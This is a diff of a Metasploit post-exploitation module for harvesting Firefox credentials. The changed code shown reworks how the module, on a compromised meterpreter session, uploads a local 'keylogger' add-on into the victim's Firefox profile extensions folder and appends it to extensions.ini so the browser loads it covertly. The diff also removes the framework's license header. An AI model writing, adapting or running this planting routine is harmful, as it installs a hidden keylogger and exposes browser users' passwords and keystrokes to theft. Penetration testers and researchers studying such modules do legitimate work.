@@ -1,14 +1,3 @@
-##
-# $Id: firefox_creds.rb 12594 2011-05-12 17:56:18Z bannedit $
-##
-
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
-##
-
 require 'msf/core'
 require 'rex'
 require 'msf/core/post/file'
@@ -28,9 +17,6 @@ class Metasploit3 < Msf::Post
 			'Platform'       => ['windows', 'linux', 'bsd', 'unix', 'osx'],
 			'SessionTypes'   => ['meterpreter', 'shell' ]
 		))
-		#TODO 
-		# - add support for decrypting the passwords without a Master Password
-		# - Collect cookies.
 	end
 
 	def run
@@ -217,7 +203,7 @@ class Metasploit3 < Msf::Post
 
     def get_file_as_string(filename)
         data = ''
-        f = File.open(filename, "r") 
+        f = ::File.open(filename, "r") 
         f.each_line do |line|
             data += line
         end
@@ -227,41 +213,50 @@ class Metasploit3 < Msf::Post
 	def upload_addon(paths)
         lpath = ::File.join(Msf::Config.install_root, "data", "post","keylogger")
 		paths.each do |path|
-            
-            print_status("Planting to #{path}") 
-            #next
-            if session.type=="meterpreter" 
+            if session.type=="meterpreter"    
+                print_status("Planting to #{path}") 
                 extpath=path+ "\\extensions"
+    
+                begin
+                    session.fs.dir.mkdir(extpath)
+                rescue
+                    print_status("Extensions directory already exists")
+                end
+
+                extpath=extpath+'\\asdf@asdf' #TODO  randomize 
                 begin
                     session.fs.dir.mkdir(extpath)
                 rescue
                 end
-
-                extpath=extpath+'\\asdf@asdf' #TODO    
-                session.fs.dir.mkdir(extpath)
-                
-                begin
-                    Dir['*/'] do |direntry|
+               
+                for direntry in Dir[lpath+'/**/'].sort{|a,b| a.split(/\//).size <=> b.split(/\//).size}
+                    begin
+                        direntry=direntry[lpath.size..direntry.size].gsub("/","\\")
                         print_status("Creating #{extpath+direntry}")
                         session.fs.dir.mkdir(extpath+direntry)
+                    rescue
+                        print_error("Could not create #{direntry}")
                     end
-                rescue
-                    print_error("Could not create #{direntry}")
                 end
-                begin
-                    Dir.foreach(lpath) do |entry|
-                        print_status("uploading #{entry} to #{path}");
-                        session.fs.file.upload_file(extpath+"\\"+entry, ::File.join(lpath,entry))
-                    end
-                rescue
-                    print_error("Could not create #{entry}")
-                end
+            end
+            if session.type != "meterpreter"
+                print_error("[TODO] Implement directory creation in non-meterpreter sessions")
+            end
 
+            for entry in Dir[lpath+'/**/*']
+                begin
+                    entry=entry[lpath.size..entry.size]
+                    remote_entry=entry.gsub("/","\\")
+                    print_status("Uploading #{::File.join(lpath,entry)} to #{extpath+remote_entry}");
+                    write_file(extpath+remote_entry,get_file_as_string(::File.join(lpath,entry)))
+                rescue 
+                    print_error("Could not upload #{entry}")
+                end
             end
-            if session.type!="meterpreter"
-                print_error("[TODO] non-Meterpreter session support");
-            end
-        end
+
+            print_status("Registering extension #{path}\\extensions.ini")
+            append_file(path+"\\extensions.ini","\nExtensionASDF="+extpath+"\n") # TODO randomize
+        end  
 	end
 
 	def got_root?
